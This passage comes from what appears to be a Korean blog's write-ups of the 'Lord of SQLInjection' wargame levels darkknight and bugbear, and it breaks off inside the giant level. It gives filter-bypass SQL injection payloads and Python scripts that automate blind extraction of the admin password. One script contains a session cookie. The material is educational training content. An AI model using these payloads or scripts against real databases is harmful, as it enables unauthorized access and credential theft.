class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">   </span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;darkknight&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
<br>

<br>

<h2 id="1-줄-3-줄-해석"><a href="#1-줄-3-줄-해석" class="headerlink" title="1 줄 ~ 3 줄 해석"></a>1 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>no 파라미터</code>에서 <code>prob</code>, <code>substr</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> <code>=</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<p><code>pw 파라미터</code>에서 <code>&#39;</code>를 필터링 하고 있습니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="7-줄-9-줄-해석"><a href="#7-줄-9-줄-해석" class="headerlink" title="7 줄 ~ 9 줄 해석"></a>7 줄 ~ 9 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;darkknight&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/darknight/solve_1.png">

<br>

<p><code>pw</code> 파라미터에는 <code>&#39;</code>를 필터링하고 있어 <code>no</code> 파라미터를 사용해야합니다.</p>
<p><code>no</code> 파라미터를 참으로 만들어주니 Hello guest가 출력되었습니다.</p>
<p><code>=</code> 특수문자는 <code>like</code>로 우회가 가능합니다.</p>
<br>

<br>

<p><code>id</code>에 <code>admin</code>을 넣어주기 위해 <code>%26%26 id like &quot;admin&quot;</code>을 해주었습니다.</p>
<p><code>&#39;</code>을 우회하기 위해 <code>&quot;</code>을 사용하였습니다.</p>
<img src="/images/Lord of SQLInjection/darknight/solve_2.png">

<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=&amp;no=1 || 1 like 1 &amp;&amp; id like &quot;admin&quot; %26%26 length(pw) like 1</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p>코드 상에는 <code>substr</code>만 필터링하고 있는데 실제로 <code>substring</code>함수 또한 필터링 하고있습니다.</p>
<p>해당 함수 대신에 <code>mid</code>함수를 사용하였습니다. <code>mid</code>함수는 <code>substring</code>함수와 동일합니다.</p>
<p><code>?pw=&amp;no=1 || 1 like 1 &amp;&amp; id like &quot;admin&quot; %26%26 mid(pw,&#123;&#125;,1) like &quot;&#123;&#125;&quot;</code> </p>
<br>

<blockquote>
<p><code>mid(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
</blockquote>
<br>

<p>예를 들어 <code>mid(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=&amp;no=1 || 1 like 1 %26%26 id like &quot;admin&quot; %26%26 &#x27;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw) like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&#x27;mid(pw,&#123;&#125;,1) like &quot;&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>pw=&amp;no=1 || 1 like 1 %26%26 id like &quot;admin&quot; %26%26 </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
<br>

<p><code>mid</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/darknight/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/darknight/solve_4.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/darknight/solve_5.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [13번_bugbear] Write UP</title>
    <url>/2021/10/23/2021-10-23-Lord_of_SQLInjection_13_bugbear/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>13번 문제인 bugbear를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/bugbear/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;bugbear&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_bugbear where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">   </span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;bugbear&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-3-줄-해석"><a href="#1-줄-3-줄-해석" class="headerlink" title="1 줄 ~ 3 줄 해석"></a>1 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|substr|ascii|=|or|and| |like|0x/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>no 파라미터</code>에서 <code>prob</code>, <code>substr</code>, <code>ascii</code>, <code>or</code>, <code>and</code>, <code>like</code>, <code>0x</code> 문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> <code>=</code> <code>(공백)</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<p><code>pw 파라미터</code>에서 <code>&#39;</code>를 필터링 하고 있습니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="7-줄-9-줄-해석"><a href="#7-줄-9-줄-해석" class="headerlink" title="7 줄 ~ 9 줄 해석"></a>7 줄 ~ 9 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_bugbear where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;bugbear&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/bugbear/solve_1.png">

<br>

<p><code>pw</code> 파라미터에는 <code>&#39;</code>를 필터링하고 있어 <code>no</code> 파라미터를 사용해야합니다.</p>
<p><code>no</code> 파라미터를 참으로 만들어주니 Hello guest가 출력되었습니다.</p>
<br>

<br>

<p><code>id</code>에 <code>admin</code>을 넣어주기 위해 <code>%26%26id/**/in(&quot;admin&quot;)</code>을 해주었습니다.</p>
<p><code>공백</code>을 우회하기 위해 주석으로 처리해주었습니다.</p>
<p><code>=</code>과 <code>like</code>가 필터링 되어있어서 <code>in(&quot;admin&quot;)</code>으로 처리해주었습니다.</p>
<p><code>&#39;</code>을 우회하기 위해 <code>&quot;</code>을 사용하였습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/bugbear/solve_2.png">

<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=&amp;no=1||1%26%26id/**/in(&quot;admin&quot;)%26%26length(pw)/**/in(&quot;1&quot;)</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p>코드 상에는 <code>substr</code>만 필터링하고 있는데 실제로 <code>substring</code>함수 또한 필터링 하고있습니다.</p>
<p>해당 함수 대신에 <code>mid</code>함수를 사용하였습니다. <code>mid</code>함수는 <code>substring</code>함수와 동일합니다.</p>
<p><code>?pw=&amp;no=1||1%26%26id/**/in(&quot;admin&quot;)%26%26mid(pw,&#123;&#125;,1)/**/in(&quot;&#123;&#125;&quot;)</code> </p>
<br>

<blockquote>
<p><code>mid(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
</blockquote>
<br>

<p>예를 들어 <code>mid(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=&amp;no=1||1%26%26id/**/in(&quot;admin&quot;)%26%26&#x27;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&#x27;length(pw)/**/in(&quot;&#123;&#125;&quot;)&#x27;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&#x27;mid(pw,&#123;&#125;,1)/**/in(&quot;&#123;&#125;&quot;)&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>pw=&amp;no=1||1%26%26id/**/in(&quot;admin&quot;)%26%26 </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
<br>

<p><code>mid</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/bugbear/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/bugbear/solve_4.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/bugbear/solve_5.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [14번_giant] Write UP</title>
    <url>/2021/10/23/2021-10-23-Lord_of_SQLInjection_14_giant/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>14번 문제인 giant를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/giant/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\n|\r|\t/i&#x27;</span>, <span class="variable">$_GET</span>[shit])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select 1234 from<span class="subst">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = 